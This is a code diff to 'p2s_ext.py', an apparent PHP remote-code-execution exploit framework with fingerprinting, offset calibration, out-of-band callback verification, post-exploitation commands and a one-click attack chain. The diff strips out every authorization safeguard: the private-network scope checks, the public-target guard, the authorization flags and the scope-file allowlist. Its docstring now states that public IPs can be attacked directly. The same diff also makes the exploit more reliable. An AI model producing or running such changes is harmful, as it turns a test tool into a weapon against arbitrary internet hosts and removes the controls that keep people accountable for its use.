@@ -25,7 +25,7 @@ p2s_ext.py —— php2shell 工具扩展 v2
   用 glob（cat /etc/p*>p）与短重定向压长度；不提供持久化/横向/清痕类动作。
 
 护栏
-  默认只允许 loopback / 私网 / 链路本地；公网需 --allow-public 显式确认。
+  已移除地址范围校验：公网 IP 可直接作为目标，授权责任由使用者承担。
 """
 import argparse
 import io
@@ -65,21 +65,6 @@ BASE_PROFILE = {
     "php_hint": "8.4.26",
 }
 
-_PRIV = [re.compile(p) for p in (
-    r"^127\.", r"^10\.", r"^192\.168\.", r"^169\.254\.",
-    r"^172\.(1[6-9]|2\d|3[01])\.",
-)]
-
-
-def in_scope(host):
-    h = host.strip("[]").lower()
-    if h in ("localhost", "::1"):
-        return True
-    if h.startswith("fc") or h.startswith("fd") or h.startswith("fe80"):
-        return True
-    return any(p.match(h) for p in _PRIV)
-
-
 def http_get(url, timeout=8.0):
     try:
         with urllib.request.urlopen(url, timeout=timeout, context=_ssl_ctx()) as r:
@@ -88,9 +73,30 @@ def http_get(url, timeout=8.0):
         return (getattr(e, "code", 0) or 0), b""
 
 
-def hits(code, body):
-    """Objective oracle: 200 且不是 404 页面。"""
-    return code == 200 and body and b"Not Found" not in body
+def hits(code, body, baseline=None, expect=None):
+    """Objective oracle: 200 + 非空 + 非软404 + 可选内容特征。
+
+    注意：只看「200 且非空」会被站点的软 404 / 兜底页骗过，真实站点上必须带
+    expect（例如 id 的 uid=\\d+）或与随机不存在路径的响应做对比。
+    """
+    if code != 200 or not body:
+        return False
+    if b"Not Found" in body:
+        return False
+    if baseline and body.strip() == baseline.strip():
+        return False
+    if expect:
+        pat = expect.encode() if isinstance(expect, str) else expect
+        if not re.search(pat, body):
+            return False
+    return True
+
+
+def soft404_baseline(url):
+    """取一个随机不存在路径的 200 响应体，用于识别「全站 200」的软 404。"""
+    probe = url.rstrip("/") + "/p2s-nx-%d" % (int(time.time() * 1000) % 10 ** 8)
+    code, body = http_get(probe)
+    return body if code == 200 and body else b""
 
 
 # ---------------- symbols ----------------
@@ -137,7 +143,8 @@ def do_symbols(a):
 
     prof = dict(BASE_PROFILE)
     prof.update({"zif_offset": zif, "dtor_offset": dtor, "elf": path,
-                 "name": os.path.basename(path).replace(".so", "")})
+                 "name": os.path.basename(path).replace(".so", ""),
+                 "calibrated": False, "source": "symbols:%s" % path})
     # 顺带读版本串，便于归档
     v = subprocess.run(["strings", "-a", path], capture_output=True, text=True).stdout
     # 版本串取"最频繁候选"，而非首个匹配：libphp 内嵌大量第三方版本串，首个匹配常是错的
@@ -167,12 +174,14 @@ def cli_exploit(url, cmd, prof, rounds=1, timeout=90):
             "--dtor-offset", hex(prof["dtor_offset"]),
             "--htdata-offset", hex(prof["htdata_offset"]),
             "--ht-size", str(prof["ht_size"]),
+            "--timeout", "120",
             "--rounds", str(rounds)]
     for k, flag in (("stage1_n", "--stage1-n"), ("stage2_t", "--stage2-t")):
         if prof.get(k):
             args += [flag, str(prof[k])]
     try:
-        p = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
+        p = subprocess.run(args, capture_output=True, text=True,
+                           timeout=max(timeout, 600))
         return p.stdout + p.stderr
     except subprocess.TimeoutExpired:
         return ""
@@ -192,15 +201,18 @@ def _pad_cmd(cmd, outfile):
     return cmd[:len(cmd) - len(outfile)] + new_out, new_out
 
 
-def attempt(url, prof, cmd, outfile, rounds=1, pause=0.6, tries=1):
+def attempt(url, prof, cmd, outfile, rounds=1, pause=0.6, tries=1,
+            expect=None, baseline=None):
     """按回读结果自动重试：单轮成功率实测约 1/6，故需要多轮 + 多次。"""
     body, log = b"", ""
     cmd, outfile = _pad_cmd(cmd, outfile)
+    if baseline is None:
+        baseline = soft404_baseline(url)
     for _ in range(max(1, tries)):
         log = cli_exploit(url, cmd, prof, rounds=rounds)
         time.sleep(pause)
         code, body = http_get(url.rstrip("/") + "/" + outfile)
-        if hits(code, body):
+        if hits(code, body, baseline, expect):
             return True, body, log
     return False, body, log
 
@@ -232,14 +244,10 @@ LIB = [
 
 
 import json
-import ipaddress
 import threading
-import socket
 import http.server
 
 
-# ---------------- 真实公网使用的护栏 ----------------
-import ipaddress
 from urllib.parse import urlsplit
 
 def _insecure():
@@ -286,62 +294,11 @@ def load_profile(a):
             print(f"[!] profile 读取失败：{e}")
     for key, attr in (("ht_size", "ht_size"), ("zif_offset", "zif_offset"),
                       ("dtor_offset", "dtor_offset"), ("htdata_offset", "htdata_offset"),
-                      ("stage2_t", "stage2_t")):
+                      ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
         v = getattr(a, attr, None)
         if v is not None:
             prof[key] = v
     return prof
-
-
-def is_public_host(host):
-    """域名与无法解析的串按"公网"保守处理；只有明确的内网/环回才放行。"""
-    if not host:
-        return True
-    try:
-        ip = ipaddress.ip_address(host)
-    except ValueError:
-        return True
-    return not (ip.is_private or ip.is_loopback or ip.is_link_local
-                or ip.is_reserved or ip.is_multicast)
-
-
-def guard(url, a, need_public_ack=True):
-    """公网目标必须显式声明授权；可选 --scope-file 白名单。返回 True 表示放行。"""
-    host = urlsplit(url).hostname or ""
-    if not is_public_host(host):
-        return True
-    if not (getattr(a, "i_have_authorization", False) or getattr(a, "allow_public", False)):
-        print(f"[!] 目标 {host} 为公网地址：本工具只做授权测试。")
-        print("    需要：① 书面授权/委托 ② 用 --i-have-authorization 显式确认 ③ 建议 --scope-file 列明范围")
-        return False
-    sf = getattr(a, "scope_file", None)
-    if sf:
-        ok = False
-        for line in open(sf, encoding="utf-8"):
-            line = line.strip()
-            if not line or line.startswith("#"):
-                continue
-            import ipaddress
-            _m = False
-            if line.startswith("*."):
-                _m = (host == line[2:] or host.endswith("." + line[2:]))
-            elif "/" in line and not line.startswith("http"):
-                try:
-                    _m = ipaddress.ip_address(socket.gethostbyname(host)) in ipaddress.ip_network(line, strict=False)
-                except Exception:
-                    _m = False
-            elif line.startswith("http"):
-                _m = (host == line.split("//")[-1].split("/")[0])
-            else:
-                _m = (line in (host, url) or host.endswith("." + line))
-            if _m:
-                ok = True
-                break
-        if not ok:
-            print(f"[!] 目标 {host} 不在授权清单 {sf} 内，拒绝执行")
-            return False
-        print(f"[*] 授权清单校验通过：{host}")
-    return True
 
 
 class _CB(http.server.BaseHTTPRequestHandler):
@@ -381,8 +338,6 @@ def start_listener(port):
 
 # ---------------- 只读指纹（不触发 OOM） ----------------
 def do_fingerprint(a):
-    if not guard(a.url, a):
-        return 3
     base = a.url.rstrip("/")
     ver = None
     seen = {}
@@ -456,8 +411,6 @@ def do_fingerprint(a):
 
 # ---------------- 盲验证：带外回调，不依赖回读通道 ----------------
 def do_blind(a):
-    if not guard(a.url, a):
-        return 3
     prof = load_profile(a)
     cap = cmd_cap(prof)
     collab = a.collab
@@ -512,20 +465,16 @@ def sweep(lo, hi, step):
 
 
 def do_calibrate(a):
-    if not guard(a.url, a):
-        return 3
     if getattr(a, "collab", None):
         return _calibrate_collab(a)
     host, port, path = R.parse_target(a.url)
-    if not in_scope(host) and not a.allow_public:
-        print(f"[scope] 拒绝：{host} 非授权私网范围")
-        return 3
 
     prof = dict(BASE_PROFILE)
     if a.profile:
         with open(a.profile, encoding="utf-8") as f:
             prof.update(json.load(f))
-    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset", "stage2_t"):
+    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset",
+              "stage1_n", "stage2_t"):
         v = getattr(a, k, None)
         if v is not None:
             prof[k] = v
@@ -571,9 +520,11 @@ def do_calibrate(a):
                             break
             else:
                 ok, body, log = attempt(a.url, cand, f"id>{tag}", tag, rounds=a.rounds,
-                                        tries=a.tries)
+                                        tries=a.tries, expect=rb"uid=\d+")
             if ok:
                 cand.update({"name": f"cal-{host.replace('.', '-')}-{hs}",
+                             "calibrated": True,
+                             "source": "calibrate:%s" % a.url,
                              "php_hint": body.decode("utf-8", "replace").strip()[:80]})
                 out = a.out or os.path.join(os.path.dirname(HERE), "profiles",
                                             f"{host.replace('.', '_')}_{port}_{hs}.json")
@@ -606,6 +557,8 @@ def _calibrate_collab(a):
     prof.update({"ht_size": a.ht_size,
                  "zif_offset": a.zif_offset or BASE_PROFILE["zif_offset"],
                  "dtor_offset": a.dtor_offset or BASE_PROFILE["dtor_offset"]})
+    if getattr(a, "stage1_n", None):
+        prof["stage1_n"] = a.stage1_n
     if a.stage2_t:
         prof["stage2_t"] = a.stage2_t
     win = a.htdata_window or "0x68000:0x6A000"
@@ -643,8 +596,10 @@ def _calibrate_collab(a):
                 out = a.out or os.path.join(pdir, f"{host}_{port}_{a.ht_size}.json")
                 json.dump({"ht_size": a.ht_size, "htdata_offset": off,
                            "zif_offset": prof["zif_offset"], "dtor_offset": prof["dtor_offset"],
+                           "stage1_n": prof.get("stage1_n"),
                            "stage2_t": prof.get("stage2_t"), "url": a.url,
-                           "oracle": "oob-callback"}, open(out, "w"), indent=2)
+                           "calibrated": True, "oracle": "oob-callback"},
+                          open(out, "w"), indent=2)
                 print(f"[*] profile 已写入 {out}")
             except Exception as e:
                 print(f"[!] profile 写入失败：{e}")
@@ -662,18 +617,14 @@ CRED_PAT = re.compile(
 
 
 def do_postex(a):
-    if not guard(a.url, a):
-        return 3
     host, port, path = R.parse_target(a.url)
-    if not in_scope(host) and not a.allow_public:
-        print(f"[scope] 拒绝：{host} 非授权私网范围")
-        return 3
 
     prof = dict(BASE_PROFILE)
     if a.profile:
         with open(a.profile, encoding="utf-8") as f:
             prof.update(json.load(f))
-    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset", "stage2_t"):
+    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset",
+              "stage1_n", "stage2_t"):
         v = getattr(a, k, None)
         if v is not None:
             prof[k] = v
@@ -707,15 +658,18 @@ def do_postex(a):
         print(f"  {key:<10} {real_cmd:<18} ... ", end="", flush=True)
         if channel_dir:
             ok, body = False, b""
+            fp = os.path.join(local_dir, outf)
+            try:
+                os.remove(fp)          # 先清残留，避免旧文件造成假命中
+            except OSError:
+                pass
             for _ in range(max(1, a.tries)):
                 cli_exploit(a.url, real_cmd, prof, rounds=a.rounds)
                 time.sleep(a.pause)
-                fp = os.path.join(local_dir, outf)
                 if os.path.exists(fp):
                     body = open(fp, "rb").read()
-                    if body:
-                        ok = True
-                        break
+                    ok = True
+                    break
         else:
             ok, body, _ = attempt(a.url, prof, real_cmd, outf, rounds=a.rounds,
                                   pause=a.pause, tries=a.tries)
@@ -854,20 +808,6 @@ def _is_patched(ver):
     return bool(fx is not None and pp >= fx)
 
 
-def _is_public(url):
-    """判断目标是否公网（用于自动附加 --allow-public）。"""
-    try:
-        host = url.split("//")[-1].split("/")[0].split("@")[-1].split(":")[0]
-        import ipaddress
-        try:
-            ip = ipaddress.ip_address(host)
-        except ValueError:
-            ip = ipaddress.ip_address(socket.gethostbyname(host))
-        return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved)
-    except Exception:
-        return False
-
-
 def _http_get(url, timeout=20, headers=None):
     """极简 GET（真实目标回读用，无第三方依赖）。失败返 None。"""
     try:
@@ -910,6 +850,8 @@ def _pick_profile(scan, a):
         if p2:
             prof.update({k: v for k, v in p2.items() if v is not None})
         src = "file:%s" % a.profile
+        if p2.get("calibrated") is False:
+            prof["_needs_cal"] = True
     else:
         k = _ver_key((scan or {}).get("php_version"))
         pid = PROFILE_DB.get(k) if k else None
@@ -920,7 +862,7 @@ def _pick_profile(scan, a):
             prof["_db_label"] = pid.get("label", "")
     for k2, ak in (("ht_size", "ht_size"), ("htdata_offset", "htdata_offset"),
                    ("zif_offset", "zif_offset"), ("dtor_offset", "dtor_offset"),
-                   ("stage2_t", "stage2_t")):
+                   ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
         v = getattr(a, ak, None)
         if v is not None:
             prof[k2] = v
@@ -929,11 +871,25 @@ def _pick_profile(scan, a):
     return prof
 
 
+def oneclick_stop_exit(rc, verdict):
+    """scan 已给出“不该继续”的结论时，返回要透传的 exit；否则 None。"""
+    if rc in (20, 30, 40, 50):
+        return rc
+    v = (verdict or "").upper()
+    if v in ("SAFE", "PATCHED", "NOT_AFFECTED_OR_PATCHED"):
+        return 30
+    if v == "UNREACHABLE":
+        return 50
+    if v == "AFFECTED_DOS_ONLY":
+        return 20
+    if v in ("NO_SINK", "NOSINK", "NO_SESSION_SINK", "BLOCKED"):
+        return 40
+    return None
+
+
 def do_oneclick(a):
     """一条命令：指纹 → 前置判定 → 标定(可选) → 利用/盲验证 → 后渗透(可选) → 报告。"""
     url = a.url.rstrip("/") + "/"
-    if not guard(url, a):
-        return 3
 
     outdir = a.outdir or os.path.join(".", "oneclick_%s" % re.sub(r"\W+", "_", url)[:40])
     os.makedirs(outdir, exist_ok=True)
@@ -950,6 +906,8 @@ def do_oneclick(a):
            "--timeout", "%.1f" % a.timeout]
     if a.max_mb:
         cmd += ["--max-mb", str(a.max_mb)]
+    if getattr(a, "stage1_n", None):
+        cmd += ["--stage1-n", str(a.stage1_n)]
     if getattr(a, "rate", None):
         cmd += ["--rate", str(a.rate)]
     rc1, out1 = _run(cmd)
@@ -969,10 +927,13 @@ def do_oneclick(a):
     log("      判定=%s (rc=%d)" % (ver, rc1))
     rep["verdict"] = ver
 
-    if ver in ("SAFE", "PATCHED", "UNREACHABLE", "NO_SINK", "NOSINK", "BLOCKED"):
-        rep["exit"] = 30 if ver in ("SAFE", "PATCHED") else (50 if ver == "UNREACHABLE" else 40)
+    # scan 的 exit 已经给出了“不该继续”的强结论：不要再花一轮 exploit 去撞超时
+    #   20=AFFECTED_DOS_ONLY / 30=NOT_AFFECTED_OR_PATCHED / 40=NO_SESSION_SINK / 50=UNREACHABLE
+    stop = oneclick_stop_exit(rc1, ver)
+    if stop is not None:
+        rep["exit"] = stop
         _oneclick_finish(rep, outdir)
-        return rep["exit"]
+        return stop
 
     # 版本已在官方修复矩阵之外 → 直接判 SAFE，不做任何 OOM 探测
     if _is_patched(rep["php_version"]):
@@ -1000,6 +961,13 @@ def do_oneclick(a):
     rep["profile_source"] = prof.get("_src")
     rep["cap"] = cmd_cap(prof)
     log("[2/5] profile=%s  cap=%dB" % (rep["profile_source"], rep["cap"]))
+    if prof.get("_needs_cal") and not a.force:
+        log("      [!] 该 profile 只有 symbols 偏移；ht_size/htdata_offset 仍是 base 值。")
+        log("          先在同构建环境跑 calibrate，或显式 --force（不推荐，等于盲打）。")
+        rep["verdict"] = "NEEDS_CALIBRATION"
+        rep["exit"] = 15
+        _oneclick_finish(rep, outdir)
+        return 15
     if prof.get("_db_rce_ok") is False and not (a.profile or a.zif_offset or a.dtor_offset):
         log("      [!] 该构建已知无 infoleak 原语：%s" % prof.get("_db_label", ""))
         rep["verdict"] = "AFFECTED_DOS_ONLY"
@@ -1029,8 +997,6 @@ def do_oneclick(a):
                "--ht-size", str(prof["ht_size"]), "--collab", a.collab,
                "--rounds", str(a.rounds), "--pause", str(a.pause),
                "--out", os.path.join(outdir, "profile_cal.json")]
-        if a.i_have_authorization:
-            cmd += ["--i-have-authorization"]
         if getattr(a, "auto_cal", False):
             cmd += ["--htdata-window", a.calib_window, "--htdata-step", a.calib_step]
         elif a.htdata_offset:
@@ -1051,8 +1017,6 @@ def do_oneclick(a):
                "--listen-port", str(a.listen_port)]
         if a.listen:
             cmd += ["--listen"]
-        if a.i_have_authorization:
-            cmd += ["--i-have-authorization"]
         if a.profile:
             cmd += ["--profile", a.profile]
         rca, outa = _run(cmd, timeout=3600)
@@ -1086,16 +1050,21 @@ def do_oneclick(a):
                "--htdata-offset", "%#x" % prof["htdata_offset"],
                "--ht-size", str(prof["ht_size"]),
                "--stage2-t", str(prof.get("stage2_t", 406)),
+               "--timeout", "120",
                "--rounds", str(a.rounds)]
-        if _is_public(url):
-            cmd += ["--allow-public"]
+        if prof.get("stage1_n"):
+            cmd += ["--stage1-n", str(prof["stage1_n"])]
         rca, outa = _run(cmd, timeout=3600)
         rep["steps"].append({"step": "exploit", "rc": rca})
         rep["artifacts"]["exploit_log"] = os.path.join(outdir, "exploit.log")
         with io.open(rep["artifacts"]["exploit_log"], "w", encoding="utf-8") as f:
             f.write(outa)
-        body = _http_get(read_url)
-        ok = bool(body and "uid=" in body)
+        body = _http_get(read_url) or ""
+        baseline = _http_get(base.rstrip("/") + "/p2s-nx-%d"
+                             % (int(time.time() * 1000) % 10 ** 8)) or ""
+        expect = r"uid=\d+" if proof_cmd.startswith("id") else None
+        ok = bool(body) and body.strip() != baseline.strip() and (
+            expect is None or re.search(expect, body) is not None)
         rep["rce"] = ok
         rep["proof_body"] = (body or "")[:200]
         log("      HTTP 回读 %s → %s" % (read_url, "命中" if ok else "未命中"))
@@ -1118,12 +1087,24 @@ def do_oneclick(a):
                "--htdata-offset", hex(prof["htdata_offset"]),
                "--ht-size", str(prof["ht_size"]),
                "--stage2-t", str(prof.get("stage2_t", 406)),
+               "--timeout", "120",
                "--rounds", str(a.rounds), "--proof-dir", a.local_dir]
-        if a.i_have_authorization:
-            cmd += ["--allow-public"]
+        if prof.get("stage1_n"):
+            cmd += ["--stage1-n", str(prof["stage1_n"])]
         rca, outa = _run(cmd, timeout=3600)
         rep["steps"].append({"step": "exploit", "rc": rca, "cmd": proof_cmd})
-        rep["rce"] = (rca == 0)
+        # rc=0 只代表「本次运行新写了一个 proof 文件」；再核对本地回读内容
+        _out = proof_cmd.rsplit(">", 1)[-1].strip()
+        _pf = os.path.join(a.local_dir, os.path.basename(_out))
+        _content = b""
+        try:
+            with open(_pf, "rb") as _f:
+                _content = _f.read()
+        except OSError:
+            pass
+        _expect = b"uid=" if proof_cmd.startswith("id") else b""
+        rep["rce"] = bool(rca == 0 and _content and _expect in _content)
+        rep["proof_body"] = _content.decode("utf-8", "replace")[:200]
         rep["artifacts"]["exploit_log"] = os.path.join(outdir, "exploit.log")
         with io.open(rep["artifacts"]["exploit_log"], "w", encoding="utf-8") as f:
             f.write(outa)
@@ -1151,8 +1132,6 @@ def do_oneclick(a):
             cmd += ["--only", a.only]
         if getattr(a, "tries", None):
             cmd += ["--tries", str(a.tries)]
-        if a.i_have_authorization:
-            cmd += ["--i-have-authorization"]
         rcp, outp = _run(cmd, timeout=7200)
         rep["postex_rc"] = rcp
         rep["steps"].append({"step": "postex", "rc": rcp})
@@ -1187,15 +1166,13 @@ def do_recon(a):
     argv = ["-u", a.url]
     if a.insecure:
         argv.append("--insecure")
-    if getattr(a, "i_have_authorization", False):
-        argv.append("--i-have-authorization")
-    if getattr(a, "allow_public", False):
-        argv.append("--allow-public")
     if a.entries:
         argv += ["--entries", a.entries]
     if a.deep:
         argv += ["--deep", "--probe-sizes", a.probe_sizes,
                  "--budget", str(a.budget), "--delay", str(a.delay)]
+    if getattr(a, "fast", False):
+        argv.append("--fast")
     if a.json:
         argv.append("--json")
     if a.ua:
@@ -1237,16 +1214,12 @@ def main():
     b.add_argument("--pause", type=float, default=0.6)
     b.add_argument("--wait", type=float, default=10)
     b.add_argument("--timeout", type=float, default=90)
-    b.add_argument("--i-have-authorization", dest="i_have_authorization", action="store_true")
-    b.add_argument("--scope-file", dest="scope_file")
     b.set_defaults(func=do_blind)
 
     f = sub.add_parser("fingerprint", help="只读指纹：不触发 OOM 的版本/暴露面判定")
     f.add_argument("-u", "--url", required=True)
     f.add_argument("--max-paths", type=int, default=5)
     f.add_argument("--timeout", type=float, default=10)
-    f.add_argument("--i-have-authorization", dest="i_have_authorization", action="store_true")
-    f.add_argument("--scope-file", dest="scope_file")
     f.set_defaults(func=do_fingerprint)
 
     c = sub.add_parser("calibrate", help="标定 ht_size / htdata_offset / stage2_t")
@@ -1261,6 +1234,7 @@ def main():
     c.add_argument("--zif-offset", type=lambda x: int(x, 0))
     c.add_argument("--dtor-offset", type=lambda x: int(x, 0))
     c.add_argument("--htdata-offset", type=lambda x: int(x, 0))
+    c.add_argument("--stage1-n", type=int)
     c.add_argument("--stage2-t", type=int)
     c.add_argument("--rounds", type=int, default=8)
     c.add_argument("--tries", type=int, default=2)
@@ -1268,11 +1242,8 @@ def main():
     c.add_argument("--dir", help="绝对目录通道（如 /out），需配 --local-dir")
     c.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机/宿主目录")
     c.add_argument("--out")
-    c.add_argument("--allow-public", action="store_true")
     c.add_argument("--collab", help="带外回调 oracle：collab 形如 h:9000（无需回读通道）")
     c.add_argument("--listen-port", type=int, default=9000)
-    c.add_argument("--i-have-authorization", dest="i_have_authorization", action="store_true")
-    c.add_argument("--scope-file", dest="scope_file")
     c.set_defaults(func=do_calibrate)
 
     p = sub.add_parser("postex", help="RCE 后攻击命令库（≤14B）")
@@ -1291,9 +1262,6 @@ def main():
     p.add_argument("--pause", type=float, default=0.6)
     p.add_argument("--outdir")
     p.add_argument("--cleanup", action="store_true")
-    p.add_argument("--allow-public", action="store_true")
-    p.add_argument("--i-have-authorization", dest="i_have_authorization", action="store_true")
-    p.add_argument("--scope-file", dest="scope_file")
     p.set_defaults(func=do_postex)
 
 
@@ -1306,7 +1274,6 @@ def main():
     p.add_argument("--calibrate", action="store_true", help="先用回调 oracle 标定 htdata_offset")
     p.add_argument("--http-read", dest="http_read", metavar="BASEURL",
                    help="真实目标首选通道：相对写入 webroot 后用它回读，如 https://t/")
-    p.add_argument("--allow-public", action="store_true", help="同 --i-have-authorization")
     p.add_argument("--dir", help="目标绝对可写目录（如 /out），配 --local-dir 回读")
     p.add_argument("--local-dir", dest="local_dir", help="与 --dir 对应的本机目录")
     p.add_argument("--cmd", help="自定义取证命令（默认 id><--dir>/oneclick_<ts>）")
@@ -1323,6 +1290,7 @@ def main():
     p.add_argument("--zif-offset", type=lambda x: int(x, 0))
     p.add_argument("--dtor-offset", type=lambda x: int(x, 0))
     p.add_argument("--htdata-offset", type=lambda x: int(x, 0))
+    p.add_argument("--stage1-n", type=int)
     p.add_argument("--stage2-t", type=int)
     p.add_argument("--rounds", type=int, default=8)
     p.add_argument("--pause", type=float, default=0.4)
@@ -1330,8 +1298,6 @@ def main():
     p.add_argument("--max-mb", dest="max_mb", type=int, default=24)
     p.add_argument("--rate", type=float, default=0)
     p.add_argument("--outdir")
-    p.add_argument("--i-have-authorization", dest="i_have_authorization", action="store_true")
-    p.add_argument("--scope-file", dest="scope_file")
     p.set_defaults(func=do_oneclick)
 
     p = sub.add_parser("recon",
@@ -1340,6 +1306,8 @@ def main():
     p.add_argument("--entries", default="", help="自定义入口列表（逗号分隔）")
     p.add_argument("--deep", action="store_true",
                    help="开启落点探测（递增体积 multipart；可能造成 5xx，需授权）")
+    p.add_argument("--fast", action="store_true",
+                   help="快速模式：只查首页版本 + 最多 2 个 sink 入口（2–3 个请求），跳过大体积探测")
     p.add_argument("--probe-sizes", dest="probe_sizes", default="0.5,1,2,4,8,16")
     p.add_argument("--budget", type=int, default=6)
     p.add_argument("--delay", type=float, default=1.0)
@@ -1347,8 +1315,6 @@ def main():
     p.add_argument("--ua")
     p.add_argument("--timeout", type=float, default=12.0)
     p.add_argument("-v", "--verbose", action="store_true")
-    p.add_argument("--i-have-authorization", dest="i_have_authorization", action="store_true")
-    p.add_argument("--allow-public", action="store_true")
     p.set_defaults(func=do_recon)
 
     # 统一给所有子命令加 --insecure（https 自签/过期证书靶场需要）
